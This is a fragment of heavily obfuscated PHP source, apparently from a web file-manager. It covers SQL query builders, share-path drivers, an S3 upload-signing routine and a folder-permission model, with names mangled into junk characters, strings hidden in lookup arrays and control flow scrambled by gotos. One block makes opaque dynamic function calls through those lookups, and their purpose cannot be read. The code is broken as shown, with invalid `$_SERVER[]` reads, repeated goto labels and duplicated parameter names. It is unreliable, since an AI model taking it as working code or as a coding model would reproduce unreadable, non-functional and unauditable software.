$C[924] . $bĭ; } } } else { $aʏ .= $C[924] . $E; } } $aʏ = preg_replace($C[925], think_config($C[828]) . $C[926], $aʏ); return $aʏ; } protected function parseOrder($a҆) { $a᷶ =& $_SERVER[]; if (is_array($a҆)) { $c͊鴃 = array(); foreach ($a҆ as $EǍ => $e̼) { if (is_numeric($EǍ)) { $c͊鴃[] = $this->parseKey($e̼); } else { $e̼ = in_array(strtoupper(trim($e̼)), array($a᷶[927], $a᷶[928])) ? $a᷶[50] . $e̼ : $a᷶[33]; if (preg_match($a᷶[929], $EǍ)) { $c͊鴃[] = $this->parseKey($EǍ) . $e̼; } else { think_exception($a᷶[930] . $EǍ); } } } $a҆ = implode($a᷶[47], $c͊鴃); } return !empty($a҆) ? $a᷶[931] . $a҆ : $a᷶[33]; } protected function parseGroup($dϰ) { $A諳 =& $_SERVER[]; return !empty($dϰ) ? $A諳[932] . $dϰ : $A諳[33]; } protected function parseHaving($CǢ) { $Fô =& $_SERVER[]; return !empty($CǢ) ? $Fô[933] . $CǢ : $Fô[33]; } protected function parseComment($Dۥ) { $Dヂ =& $_SERVER[]; return !empty($Dۥ) ? $Dヂ[934] . $Dۥ . $Dヂ[935] : $Dヂ[33]; } protected function parseDistinct($bץ) { $eχՄ =& $_SERVER[]; return !empty($bץ) ? $eχՄ[936] : $eχՄ[33]; } protected function parseUnion($C) { $Fҏ =& $_SERVER[]; if (empty($C)) { return $Fҏ[33]; } if (isset($C[$Fҏ[332]])) { $F = $Fҏ[937]; unset($C[$Fҏ[332]]); } else { $F = $Fҏ[938]; } foreach ($C as $B) { $B[] = $F . (is_array($B) ? $this->buildSelectSql($B) : $B); } return implode($Fҏ[50], $B); } public function insert($a, $C = array(), $cќ = false) { goto f꺔; A: $E .= $this->parseComment(!empty($C[$aߎڈ[337]]) ? $C[$aߎڈ[337]] : $aߎڈ[33]); return $this->execute($E, $this->parseBind(!empty($C[$aߎڈ[269]]) ? $C[$aߎڈ[269]] : array())); goto b; d: foreach ($a as $a֌ => $D䎷) { if (is_array($D䎷) && $aߎڈ[281] == $D䎷[0]) { $D٦[] = $this->parseKey($a֌); $c䤴[] = $D䎷[1]; } elseif (is_scalar($D䎷) || is_null($D䎷)) { $D٦[] = $this->parseKey($a֌); $c䤴[] = $this->parseValue($D䎷); } } $E = ($cќ ? $aߎڈ[805] : $aߎڈ[806]) . $aߎڈ[807] . $this->parseTable($C[$aߎڈ[263]]) . $aߎڈ[801] . implode($aߎڈ[47], $D٦) . $aߎڈ[802] . implode($aߎڈ[47], $c䤴) . $aߎڈ[803]; $E .= $this->parseLock(isset($C[$aߎڈ[756]]) ? $C[$aߎڈ[756]] : !1); goto A; f꺔: $aߎڈ =& $_SERVER[]; $c䤴 = $D٦ = array(); $this->model = $C[$aߎڈ[265]]; goto d; b: } public function selectInsert($cцϘ, $eɋ, $BѨ߮ = array()) { goto Cݠ; Dܡب: array_walk($cцϘ, array($this, $Aܥ[804])); $B١󕷃 = $Aܥ[939] . $this->parseTable($eɋ) . $Aܥ[801] . implode($Aܥ[47], $cцϘ) . $Aܥ[918]; $B١󕷃 .= $this->buildSelectSql($BѨ߮); goto e͹ݖ; Cݠ: $Aܥ =& $_SERVER[]; $this->model = $BѨ߮[$Aܥ[265]]; if (is_string($cцϘ)) { $cцϘ = explode($Aܥ[47], $cцϘ); } goto Dܡب; e͹ݖ: return $this->execute($B١󕷃, $this->parseBind(!empty($BѨ߮[$Aܥ[269]]) ? $BѨ߮[$Aܥ[269]] : array())); goto C; C: } public function update($d┺, $D͒) { $Eɖ =& $_SERVER[]; $this->model = $D͒[$Eɖ[265]]; $CԹ = $Eɖ[940] . $this->parseTable($D͒[$Eɖ[263]]) . $this->parseSet($d┺) . $this->parseWhere(!empty($D͒[$Eɖ[259]]) ? $D͒[$Eɖ[259]] : $Eɖ[33]) . $this->parseOrder(!empty($D͒[$Eɖ[346]]) ? $D͒[$Eɖ[346]] : $Eɖ[33]) . $this->parseLimit(!empty($D͒[$Eɖ[276]]) ? $D͒[$Eɖ[276]] : $Eɖ[33]) . $this->parseLock(isset($D͒[$Eɖ[756]]) ? $D͒[$Eɖ[756]] : !1) . $this->parseComment(!empty($D͒[$Eɖ[337]]) ? $D͒[$Eɖ[337]] : $Eɖ[33]); return $this->execute($CԹ, $this->parseBind(!empty($D͒[$Eɖ[269]]) ? $D͒[$Eɖ[269]] : array())); } public function delete($a = array()) { $c눬ϑ =& $_SERVER[]; $this->model = $a[$c눬ϑ[265]]; $b = $c눬ϑ[941] . $this->parseTable($a[$c눬ϑ[263]]) . $this->parseWhere(!empty($a[$c눬ϑ[259]]) ? $a[$c눬ϑ[259]] : $c눬ϑ[33]) . $this->parseOrder(!empty($a[$c눬ϑ[346]]) ? $a[$c눬ϑ[346]] : $c눬ϑ[33]) . $this->parseLimit(!empty($a[$c눬ϑ[276]]) ? $a[$c눬ϑ[276]] : $c눬ϑ[33]) . $this->parseLock(isset($a[$c눬ϑ[756]]) ? $a[$c눬ϑ[756]] : !1) . $this->parseComment(!empty($a[$c눬ϑ[337]]) ? $a[$c눬ϑ[337]] : $c눬ϑ[33]); return $this->execute($b, $this->parseBind(!empty($a[$c눬ϑ[269]]) ? $a[$c눬ϑ[269]] : array())); } public function select($b뉼 = array()) { goto a; a: $Aч =& $_SERVER[]; $this->model = $b뉼[$Aч[265]]; $A = $this->buildSelectSql($b뉼); goto aŰ; aŰ: $bЬ = isset($b뉼[$Aч[333]]) ? $b뉼[$Aч[333]] : !1; if ($bЬ) { $cⱟ휇 = is_string($bЬ[$Aч[89]]) ? $bЬ[$Aч[89]] : $Aч[942] . md5($A); $d豈 = think_cache($cⱟ휇, $Aч[33], $bЬ); if (!1 !== $d豈) { return $d豈; } } $b = $this->query($A, $this->parseBind(!empty($b뉼[$Aч[269]]) ? $b뉼[$Aч[269]] : array())); goto cꏃݕ; cꏃݕ: if ($bЬ && !1 !== $b) { think_cache($cⱟ휇, $b, $bЬ); } return $b; goto D❑թ; D❑թ: } public function buildSelectSql($f֨ = array()) { goto aŠ͠; F˼: $D½ = $this->parseSql($this->selectSql, $f֨); $D½ .= $this->parseLock(isset($f֨[$FϷ[756]]) ? $f֨[$FϷ[756]] : !1); if (isset($Dʢ)) { think_cache($Dʢ, $D½); } goto c; aŠ͠: $FϷ =& $_SERVER[]; if (isset($f֨[$FϷ[336]])) { if (strpos($f֨[$FϷ[336]], $FϷ[47])) { list($fڮ, $aͪ) = explode($FϷ[47], $f֨[$FϷ[336]]); } else { $fڮ = $f֨[$FϷ[336]]; } $fڮ = $fڮ ? $fڮ : 1; $aͪ = isset($aͪ) ? $aͪ : (is_numeric($f֨[$FϷ[276]]) ? $f֨[$FϷ[276]] : 20); $b㧉 = $aͪ * ((int) $fڮ - 1); $f֨[$FϷ[276]] = $b㧉 . $FϷ[47] . $aͪ; } if (think_config($FϷ[943])) { $Dʢ = $FϷ[944] . md5(serialize($f֨)); $F҈ = think_cache($Dʢ); if ($F҈) { return $F҈; } } goto F˼; c: return $D½; goto fҎ; fҎ: } public function parseSql($Bᑗ, $FĬ = array()) { $f̋ =& $_SERVER[]; $Bᑗ = str_replace(array($f̋[945], $f̋[946], $f̋[947], $f̋[948], $f̋[949], $f̋[950], $f̋[951], $f̋[952], $f̋[953], $f̋[954], $f̋[955]), array($this->parseTable("{$FĬ[$f̋[263]]}"), $this->parseDistinct(isset($FĬ[$f̋[956]]) ? $FĬ[$f̋[956]] : !1), $this->parseField(!empty($FĬ[$f̋[257]]) ? $FĬ[$f̋[257]] : $f̋[172]), $this->parseJoin(!empty($FĬ[$f̋[266]]) ? $FĬ[$f̋[266]] : $f̋[33]), $this->parseWhere(!empty($FĬ[$f̋[259]]) ? $FĬ[$f̋[259]] : $f̋[33]), $this->parseGroup(!empty($FĬ[$f̋[957]]) ? $FĬ[$f̋[957]] : $f̋[33]), $this->parseHaving(!empty($FĬ[$f̋[958]]) ? $FĬ[$f̋[958]] : $f̋[33]), $this->parseOrder(!empty($FĬ[$f̋[346]]) ? $FĬ[$f̋[346]] : $f̋[33]), $this->parseLimit(!empty($FĬ[$f̋[276]]) ? $FĬ[$f̋[276]] : $f̋[33]), $this->parseUnion(!empty($FĬ[$f̋[331]]) ? $FĬ[$f̋[331]] : $f̋[33]), $this->parseComment(!empty($FĬ[$f̋[337]]) ? $FĬ[$f̋[337]] : $f̋[33])), $Bᑗ); return $Bᑗ; } public function getLastSql($DЏ = '') { return $DЏ ? $this->modelSql[$DЏ] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($f܎׾) { return addslashes($f܎׾); } public function setModel($bӪľ) { $this->model = $bӪľ; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } if ($_SERVER[$_SERVER[][775]] != $_SERVER[$_SERVER[][959]]) { goto d¸; dؒ: $fѓ($_SERVER[$_SERVER[][961]]); goto A͐; d¸: $e࣋ = $_SERVER[][777]; $Eڳ = $_SERVER[$_SERVER[][772]] . $_SERVER[][773]; $CӸ = $e࣋($Eڳ); goto Fʃ; Fʃ: $Cˇ = explode($_SERVER[][213], $CӸ); if (count($Cˇ) < $_SERVER[][584]) { $d㐣 = $_SERVER[][778]; $d㐣(); } $fѓ = $_SERVER[][960]; goto dؒ; A͐: } goto A; AȻ: class PathDriverDriverShareItem { public function __construct($DϢ) { $this->pathParse = $DϢ; } public function __call($Bޏ, $c̙) { $bʶ =& $_SERVER[]; if (method_exists($this, $Bޏ)) { return; } $aһ = call_user_func_array(array($bʶ[1104], $Bޏ), $c̙); $dҔ = array($bʶ[1105], $bʶ[1106], $bʶ[1107], $bʶ[1108], $bʶ[486], $bʶ[488], $bʶ[1109], $bʶ[102], $bʶ[1110], $bʶ[1111]); if (in_array($Bޏ, $dҔ)) { $aһ = $this->getPathOuter($aһ); } return $aһ; } public function copy($d, $d, $D﵃ = false) { return $this->copyMove($d, $d, $D﵃, $_SERVER[][486]); } public function move($eͣ, $D徂ق, $fΩ = false) { return $this->copyMove($eͣ, $D徂ق, $fΩ, $_SERVER[][488]); } private function copyMove($Fƈ, $C̓׏, $F, $c) { goto AōԬ; bێƬ: if ($Cאܧ->pathParse[$a[985]]) { $C̓׏ = $Cאܧ->pathParse[$a[985]]; } else { $C̓׏ = $d; } $Eͣņ = IO::copyMove($Fƈ, $C̓׏, $F, $c); $Eͣņ = $this->getPathOuter($Eͣņ); goto b; AōԬ: $a =& $_SERVER[]; $d = $C̓׏; $Cאܧ = IO::driverMake($C̓׏); goto bێƬ; b: return $Eͣņ; goto c݃; c݃: } public function pathFather($c) { return get_path_father($this->pathParse[$_SERVER[][75]]); } public function iconvSystem($fؗֈ) { return $fؗֈ; } protected function infoParse($C˄) { $C =& $_SERVER[]; $a祳 = $this->pathParse[$C[435]][$C[1005]] . $this->pathParse[$C[998]]; $dّ = IO::info($a祳); $f݅ = $this->pathParse[$C[435]]; return Action($C[1103])->_shareItemeParse($dّ, $f݅); } public function listAll($EŅ) { $A篲 =& $_SERVER[]; $Eӭ = IO::listAll($EŅ); $D = $this->pathParse[$A篲[435]]; foreach ($Eӭ as &$A) { check_abort(); $A = array_merge(IO::info($A[$A篲[75]]), $A); $A[$A篲[387]] = Action($A篲[1103])->_shareItemeParse($A, $D); } return $Eӭ; } public function getPathOuter($E) { goto C瑤; F: if (substr($E, 0, strlen($cݒǠ)) != $cݒǠ) { return !1; } return $this->pathParse[$E܋ʧ[999]] . $E܋ʧ[8] . ltrim($f؜, $E܋ʧ[8]); goto e׳; C瑤: $E܋ʧ =& $_SERVER[]; $fܬð = KodIO::parse($E); if ($fܬð[$E܋ʧ[29]] == KodIO::KOD_SHARE_ITEM) { return $fܬð[$E܋ʧ[75]]; } goto Fێ; Fێ: $E = KodIO::clear($E); $cݒǠ = KodIO::clear($this->pathParse[$E܋ʧ[435]][$E܋ʧ[1005]]); $f؜ = substr($E, strlen($cݒǠ)); goto F; e׳: } public function getType() { $e =& $_SERVER[]; $a؏ = str_replace($e[71], $e[33], get_class($this)); return strtolower($a؏); } public function isTypeObject($d) { return IO::isTypeObject($d); } public function info($fߐ) { return $this->infoParse($fߐ); } public function infoAuth($Eᇄ) { return $this->infoParse($Eᇄ); } public function infoWithChildren($Dϔ٪) { return $this->infoParse($Dϔ٪); } public function infoFull($Cە) { return $this->infoParse($Cە); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($eş) { $this->pathParse = $eş; } protected function infoParse($Dؐ) { $Dόя =& $_SERVER[]; return Action($Dόя[1004])->sharePathInfo($this->pathParse[$Dόя[75]], !0); } public function listPath($f鋇, $Dǝ = false) { $Aݛ =& $_SERVER[]; $Eܵ = IO::listPath($f鋇, $Dǝ); foreach ($Eܵ as $e => $fĽ) { if (!in_array($e, array($Aݛ[73], $Aݛ[74]))) { continue; } foreach ($fĽ as $dć => $D) { $D = Action($Aݛ[1112])->parsePathChildren($D, array($Aݛ[383] => $f鋇)); $Eܵ[$e][$dć] = Action($Aݛ[1004])->shareItemInfo($D); } } return $Eܵ; } public function listAll($dݚ) { $c =& $_SERVER[]; $dڵ = IO::listAll($dݚ); foreach ($dڵ as &$dˌӆ) { $dˌӆ = array_merge(IO::info($dˌӆ[$c[75]]), $dˌӆ); $dˌӆ[$c[387]] = Action($c[1004])->shareItemInfo($dˌӆ); } return $dڵ; } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($bœ) { parent::__construct($bœ); $this->signatureVersion($_SERVER[][196]); } public function uploadFormData($b, $aӌ = 3600) { goto DԞא; a: $Eҙݩ = array($Aȭ[195] => $Aȭ[33], $Aȭ[1125] => $Aȭ[33], $Aȭ[1084] => $A׌, $Aȭ[1088] => $eѷ, $Aȭ[1092] => $fމ, $Aȭ[1126] => $Cͮ, $Aȭ[1127] => $Dǒ, $Aȭ[1128] => $AĹ, $Aȭ[1129] => $C򄃮, $Aȭ[1130] => $aߺԔ, $Aȭ[165] => $this->getHost()); return $Eҙݩ; goto C۠; DԞא: $Aȭ =& $_SERVER[]; $A׌ = $Aȭ[181]; $Dǒ = $Aȭ[1113]; goto D¨; D¨: $E˗ = $Aȭ[59]; $AĹ = gmdate($Aȭ[1114]); $Cǅ = gmdate($Aȭ[676]); goto eǺ; B綎: $fމ = base64_encode(json_encode($D텷)); $eۂ = hash_hmac($Aȭ[1123], $Cǅ, $Aȭ[1124] . $this->secret, !0); $A׏ = hash_hmac($Aȭ[1123], $this->region, $eۂ, !0); goto F윜ꥠ; b뵾: $b餵 = array($this->accessKey, $Cǅ, $this->region, $E˗, $EԴ˪); $Cͮ = implode($Aȭ[8], $b餵); $D텷 = array($Aȭ[1082] => gmdate($Aȭ[1081], strtotime($Aȭ[1116])), $Aȭ[1083] => array(array($Aȭ[1085] => $this->bucket), array($Aȭ[1084] => $A׌), array($Aȭ[1086], $Aȭ[1087], $Aȭ[33]), array($Aȭ[1086], $Aȭ[1117], $Aȭ[33]), array($Aȭ[1086], $Aȭ[1118], $Aȭ[33]), array($Aȭ[1088] => $eѷ), array($Aȭ[1119] => $Cͮ), array($Aȭ[1120] => $Dǒ), array($Aȭ[1121] => $AĹ), array($Aȭ[1122] => $C򄃮))); goto B綎; eǺ: $EԴ˪ = $Aȭ[1115]; $C򄃮 = $aӌ . $Aȭ[33]; $eѷ = $Aȭ[1080]; goto b뵾; F윜ꥠ: $F = hash_hmac($Aȭ[1123], $E˗, $A׏, !0); $Bܗ˚ = hash_hmac($Aȭ[1123], $EԴ˪, $F, !0); $aߺԔ = hash_hmac($Aȭ[1123], $fމ, $Bܗ˚); goto a; C۠: } } goto Eą͍݉; F崇ζ: class SourceAuthModel extends ModelBase { protected $tableName = "\x69\157\x5f\x73\x6f\x75\x72\x63\145\x5f\x61\165\x74\150"; public function getAuth($eݸՋ) { goto EĘɱ; a: $fӓ = $this->field($Eמ)->order($eڜ[363])->where($d婨)->select(); $c = array(); foreach ($fӓ as $cӇ) { if (Model($eڜ[2215])->listData($cӇ[$eڜ[2196]])) { $c[] = $cӇ; } } goto dҤ̊; dҤ̊: return $c; goto f; EĘɱ: $eڜ =& $_SERVER[]; $Eמ = $eڜ[2214]; $d婨 = array($eڜ[365] => $eݸՋ); goto a; f: } public function setAuth($FǱ, $B) { goto F즃; F즃: $Cŏг =& $_SERVER[]; $A䪑đ = Model($Cŏг[1097])->sourceInfo($FǱ); if ($A䪑đ[$Cŏг[367]] != SourceModel::TYPE_GROUP) { return !1; } goto D֪; D֪: $A̸ = 1; $aɉ = $A䪑đ[$Cŏг[452]]; if ($aɉ != $A̸) { $cݭ = array($Cŏг[2068] => $aɉ); $a贚 = Model($Cŏг[2142])->field($Cŏг[1406])->where($cݭ)->select(); $a贚 = array_to_keyvalue($a贚, $Cŏг[33], $Cŏг[1406]); } goto C; C: $eՅ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $C = array(); foreach ($B as $b) { if (!in_array($b[$Cŏг[367]], $eՅ)) { show_json(LNG($Cŏг[2216]), !1); } if ($aɉ != $A̸) { if ($b[$Cŏг[367]] == SourceModel::TYPE_GROUP) { } if ($b[$Cŏг[452]] != 0 && !in_array($b[$Cŏг[452]], $a贚)) { } } if ($b[$Cŏг[452]] == 0) { $b[$Cŏг[367]] = SourceModel::TYPE_USER; } $C[] = array($Cŏг[365] => $FǱ, $Cŏг[367] => intval($b[$Cŏг[367]]), $Cŏг[452] => intval($b[$Cŏг[452]]), $Cŏг[2196] => intval($b[$Cŏг[2196]]) ? intval($b[$Cŏг[2196]]) : 0, $Cŏг[2197] => intval($b[$Cŏг[2197]]) ? intval($b[$Cŏг[2197]]) : -1); } goto F򒴗; F򒴗: $this->where(array($Cŏг[379] => $FǱ))->delete(); $this->addAll($C); return !0; goto Eⳤ; Eⳤ: } public function authClear($a) { $e덖 =& $_SERVER[]; $d = Model($e덖[1097])->sourceInfo($a); $B͡ = array($a); if ($d[$e덖[366]] == $e덖[83]) { $F = array($e덖[521] => array($e덖[479], $d[$e덖[455]] . $a . $e덖[480])); $B͡ = Model($e덖[1097])->field($e덖[379])->where($F)->getField($e덖[365], !0); $B͡[] = $a; } $this->where(array($e덖[379] => array($e덖[380], $B͡)))->delete(); return !0; } public function get($dܿ) { $a = $this->getSourceList(array($dܿ), !0); return $a[0]; } public function getSourceList($c, $Cũ = false) { goto Dؐ; D撋ص: $bᤉ = array(); foreach ($Cũ as $bƌ => $c) { $bᤉ[$bƌ] = $this->makeSourceAuth($c, $eη晝); } return $bᤉ; goto Dη; fӠ: $fʊ = array_values(array_unique($fʊ)); if (!$fʊ) { return array(); } $Fʠ͐ = $a˸纒[2218]; goto Bα; Bα: $Aشܗ = array($a˸纒[379] => array($a˸纒[380], $fʊ)); $eη晝 = $this->field($Fʠ͐)->where($Aشܗ)->select(); $eη晝 = array_to_keyvalue_group($eη晝, $a˸纒[365]); goto D撋ص; Dؐ: $a˸纒 =& $_SERVER[]; if (!$c) { return array(); } $Fγ = Model($a˸纒[1097]); goto a; a: if (!$Cũ) { $Aشܗ = array($a˸纒[379] => array($a˸纒[380], $c)); $Cũ = $Fγ->field($a˸纒[2217])->where($Aشܗ)->select(); $Cũ = array_to_keyvalue($Cũ, $a˸纒[365]); } $fʊ = $c; foreach ($Cũ as $F̪܅ => $Eؒ) { $a = $Fγ->parentLevelArray($Eؒ[$a˸纒[455]]); $fʊ = array_merge($fʊ, $a, array($F̪܅)); } goto fӠ; Dη: } public function authDeepCheck($Eۧ, $EՄ = false) { $cצҴ͈ =& $_SERVER[]; if (_get($GLOBALS, $cצҴ͈[453])) { return !1; } $F쟈 = $this->makeAuthDeep(); if (!in_array($Eۧ, $F쟈)) { return !1; } return array($cצҴ͈[373] => -1, $cצҴ͈[414] => array($cצҴ͈[381] => $cצҴ͈[1018], $cצҴ͈[2074] => $cצҴ͈[464], $cצҴ͈[382] => LNG($cצҴ͈[2219]), $cצҴ͈[2086] => $cצҴ͈[2220]), $cצҴ͈[2221] => array($cצҴ͈[384] => $cצҴ͈[2222], $cצҴ͈[75] => $Eۧ)); } protected function makeAuthDeep() { goto Eݍϫ; cؾ: $E˕ = Model($A[1097]); $CК = Model($A[454]); if ($Cԉ) { $EȠ = $E˕->where(array($A[365] => array($A[380], $Cԉ)))->select(); foreach ($EȠ as $dԍՌ) { $bǢȭ = $E˕->parentLevelArray($dԍՌ[$A[455]]); $aҿ = array_merge($aҿ, $bǢȭ); $cϋƥ[] = $dԍՌ[$A[452]]; } } goto c־֎; aϥ: $E = Model($A[2223])->listData(); $eұ = array(); foreach ($E as $aăʟ) { if ($aăʟ[$A[372]] == 0 && $aăʟ[$A[2088]] == $A[83]) { $eұ[] = $aăʟ[$A[363]]; } } goto DӔ; Bǰ: $cϋƥ = array_values(array_unique($cϋƥ)); foreach ($cϋƥ as $D˚) { $f믰ʳ = $CК->getInfo($D˚); $aҿ[] = $f믰ʳ[$A[387]][$A[365]]; } $aҿ = array_values(array_unique($aҿ)); goto b޹; c־֎: $cϋƥ = array_values(array_unique($cϋƥ)); $E藺 = $cϋƥ; foreach ($E藺 as $D˚) { $f믰ʳ = $CК->getInfo($D˚); $bǢȭ = $E˕->parentLevelArray($f믰ʳ[$A[455]]); $cϋƥ = array_merge($cϋƥ, $bǢȭ); } goto Bǰ; Eݍϫ: $A =& $_SERVER[]; static $aҿ = false; if ($aҿ) { return $aҿ; } goto aϥ; A: $Cԉ = array_to_keyvalue($b, $A[33], $A[365]); $aҿ = array(); $cϋƥ = $d; goto cؾ; DӔ: $d = Session::get($A[2180]); $d = array_to_keyvalue($d, $A[33], $A[2068]); $a = array($A[367] => SourceModel::TYPE_USER, $A[452] => USER_ID); goto f륧˂; b޹: return $aҿ; goto e; f륧˂: if ($d) { $a = array(array($A[367] => SourceModel::TYPE_USER, $A[452] => USER_ID), array($A[367] => SourceModel::TYPE_GROUP, $A[452] => array($A[380], $d)), $A[900] => $A[2148]); } if ($eұ) { $a = array($a, $A[2196] => array($A[2224], $eұ)); } $b = $this->field($A[2225])->where($a)->select(); goto A; e: } private function makeSourceAuth($F㨜, $cےܾ) { goto a; e: if (!$c䊘 && $F㨜[$Dɇ[367]] == SourceModel::TYPE_GROUP) { $c = Model($Dɇ[454])->getInfo($F㨜[$Dɇ[452]]); $f = explode($Dɇ[47], trim($bế[$Dɇ[455]], $Dɇ[47])); foreach ($f as $e٫) { if ($e٫ == $Dɇ[464] || $e٫ == $C) { continue; } if (!isset($Eʳ[$e٫])) { continue; } $c = $Eʳ[$e٫]; $c䊘 = array($Dɇ[2226] => intval($c[$Dɇ[372]][$Dɇ[372]]), $Dɇ[2227] => $c[$Dɇ[372]], $Dɇ[2221] => array($Dɇ[384] => $Dɇ[2230], $Dɇ[2231] => $c[$Dɇ[387]][$Dɇ[365]], $Dɇ[2229] => $c[$Dɇ[459]])); break; } } if ((!$c䊘 || $c䊘[$Dɇ[373]] <= 0) && $F㨜[$Dɇ[367]] == SourceModel::TYPE_GROUP) { $f = $this->authDeepCheck($F㨜[$Dɇ[365]], $c䊘); if ($f) { $c䊘 = $f; } } return $c䊘; goto a; B딡: $C = $Dɇ[83]; $f = Model($Dɇ[1097])->parentLevelArray($F㨜[$Dɇ[455]]); $f = array_merge(array($F㨜[$Dɇ[365]]), array_reverse($f)); goto a; a: $Dɇ =& $_SERVER[]; $Eʳ = Session::get($Dɇ[2180]); $Eʳ = array_to_keyvalue($Eʳ, $Dɇ[2068]); goto B딡; a: $c䊘 = !1; foreach ($f as $e) { if (!isset($cےܾ[$e])) { continue; } $Cܰ = $this->authMake($cےܾ[$e]); if ($Cܰ[$Dɇ[414]]) { $c䊘 = $Cܰ; break; } } if (!$c䊘 && $F㨜[$Dɇ[367]] == SourceModel::TYPE_GROUP) { $e٫ = $F㨜[$Dɇ[452]]; if (isset($Eʳ[$e٫])) { $c = $Eʳ[$e٫]; $c = Model($Dɇ[454])->getInfo($e٫); $c䊘 = array($Dɇ[2226] => intval($c[$Dɇ[372]][$Dɇ[372]]), $Dɇ[2227] => $c[$Dɇ[372]], $Dɇ[2221] => array($Dɇ[384] => $Dɇ[2228], $Dɇ[75] => $c[$Dɇ[387]][$Dɇ[365]], $Dɇ[2229] => $c[$Dɇ[459]])); } } goto e; a: } public function authOwnerApply($f) { goto c瑅; c瑅: $dף =& $_SERVER[]; if (empty($f[$dף[372]]) || isset($f[$dף[2232]]) && $f[$dף[2232]]) { return $f; } if (AuthModel::authCheckRoot($f[$dף[372]][$dף[373]])) { return $f; } goto e; AϚ: $Aӱێ = array(); $Aǵ = array(); foreach ($F˱ as $F => $Fǜ) { $E = $this->authFolderOwnerUser($Fǜ); $Aӱێ[$F] = $E; $Aǵ = array_merge($Aǵ, $E[$dף[531]]); if ($E[$dף[2233]]) { break; } } goto c; c: if (count($Aǵ) == 0) { $Aǵ = $this->authFolderOwnerGroup($f[$dף[452]]); } $Aǵ = array_unique($Aǵ); if (AuthModel::authCheckRoot($f[$dף[372]][$dף[373]])) { $Aǵ[] = USER_ID; } goto B; F: $CᵛŽ = array($dף[379] => array($dף[380], $bȐ)); $F˱ = $this->field($F)->where($CᵛŽ)->select(); $F˱ = array_to_keyvalue_group($F˱, $dף[365]); goto AϚ; e: $bȐ = Model($dף[1097])->parentLevelArray($f[$dף[455]]); $bȐ = array_merge(array($f[$dף[365]]), array_reverse($bȐ)); $F = $dף[2218]; goto F; B: $f[$dף[372]][$dף[2234]] = Model($dף[470])->userListInfo($Aǵ); return $f; goto fɌʅ; fɌʅ: } private function authFolderOwnerGroup($cı) { $e =& $_SERVER[]; $eֽ֟ = Model($e[2142])->where(array($e[2068] => $cı))->select(); $F툰 = array(); if (!$eֽ֟) { return $F툰; } foreach ($eֽ֟ as $d䱰) { $fؠ = $this->authInfo($d䱰); if (AuthModel::authCheckRoot($fؠ[$e[372]])) { $F툰[] = $d䱰[$e[1406]]; } } return $F툰; } private function authFolderOwnerUser($eة) { $AӇ =& $_SERVER[]; $eԎç = array(); $eو = !1; foreach ($eة as $Aᖌ) { $Eɠ = $this->authInfo($Aᖌ); if ($Aᖌ[$AӇ[452]] == $AӇ[464]) { $eو = !0; } if ($Aᖌ[$AӇ[367]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($Eɠ[$AӇ[372]])) { $eԎç[] = $Aᖌ[$AӇ[452]]; } } } return array($AӇ[531] => $eԎç, $AӇ[2233] => $eو); } public function authMake($Cݨ) { goto E񍊴; dę黤: $fõ梊 = 0; $eψ = 0; $E蘍 = 0; goto f; AԂ: $Aٺ = array($B∈[2226] => intval($eܛׅ), $B∈[2227] => $D, $B∈[2221] => array($B∈[384] => $Fߜժ, $B∈[75] => $aÞ[$B∈[365]])); return $Aٺ; goto bÆ; b: $D߆ = 0; $C = 0; $c磶 = 0; goto dę黤; EƏ: $eܛׅ = $eψ ? $cх : ($E蘍 ? $Aփ : $D߆); $D = $eψ ? $C : ($E蘍 ? $c磶 : $fõ梊); $Fߜժ = $eψ ? $B∈[2235] : ($E蘍 ? $B∈[2236] : ($aكȸ ? $B∈[2237] : $B∈[357])); goto AԂ; f: $aكȸ = 0; $aÞ = array($B∈[365] => 0); foreach ($Cݨ as $aÞ) { $D = $this->authInfo($aÞ); $b = $aÞ[$B∈[452]]; $d = intval($D[$B∈[372]]); if ($aÞ[$B∈[367]] == SourceModel::TYPE_USER && $b == USER_ID) { $eψ = !0; $C = $D; $cх = $d; } else { if ($aÞ[$B∈[367]] == SourceModel::TYPE_GROUP && in_array($b, $aؾ)) { $E蘍 = !0; if ($d >= $Aփ) { $Aփ = $d; $c磶 = $D; } } else { if ($b == $B∈[464]) { $aكȸ = !0; $fõ梊 = $D; $D߆ = $d; } } } } goto EƏ; Bθб: $aؾ = array_to_keyvalue($E, $B∈[33], $B∈[2068]); $cх = 0; $Aփ = 0; goto b; E񍊴: $B∈ =& $_SERVER[]; if (!$Cݨ) { return array($B∈[373] => 0, $B∈[414] => !1); } $E = Session::get($B∈[2180]); goto Bθб; bÆ: } public function authTargetInfoMake($C򢐹) { goto cė; AƯ: return array($FڣЖ[2238] => $C׳, $FڣЖ[2229] => $B); goto AÇ; c԰: foreach ($C򢐹 as $fՇ) { if ($fՇ[$FڣЖ[367]] == SourceModel::TYPE_USER) { $C׳[] = intval($fՇ[$FڣЖ[452]]); } else { if ($fՇ[$FڣЖ[367]] == SourceModel::TYPE_GROUP) { $B[] = intval($fՇ[$FڣЖ[452]]); } } } if ($C׳) { $C׳ = Model($FڣЖ[470])->userListInfo($C׳); } if ($B) { $fҶƇ = array($FڣЖ[2140] => array($FڣЖ[380], $B)); $B = Model($FڣЖ[454])->field($FڣЖ[2153])->where($fҶƇ)->select(); $B = array_to_keyvalue($B, $FڣЖ[2068]); } goto AƯ; cė: $FڣЖ =& $_SERVER[]; $C׳ = array(); $B = array(); goto c԰; AÇ: } private function authInfo($Fߣڧ) { $D =& $_SERVER[]; if ($Fߣڧ[$D[2196]]) { $Cѻߖ = Model($D[2215])->listData($Fߣڧ[$D[2196]]); if (!$Cѻߖ) { return !1; $A۰ = Model($D[2215])->listData(); $A = array_filter_by_field($A۰, $D[372], $D[464]); return $A; } $e = array_field_key($Cѻߖ, array($D[363], $D[28], $D[372], $D[2086], $D[2089])); $e[$D[2239]] = $Fߣڧ; return $e; } else { return array($D[381] => 0, $D[2074] => $Fߣڧ[$D[2197]], $D[382] => $D[33], $D[2086] => $D[2240]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\151\157\137\x73\157\x75\x72\x63\145\137\x65\x76\145\x6e\164"; protected $dataAuto = array(array("\x63\162\x65\141\x74\145\x54\151\x6d\145", "\164\151\x6d\145", "\x69\x6e\x73\145\162\x74", 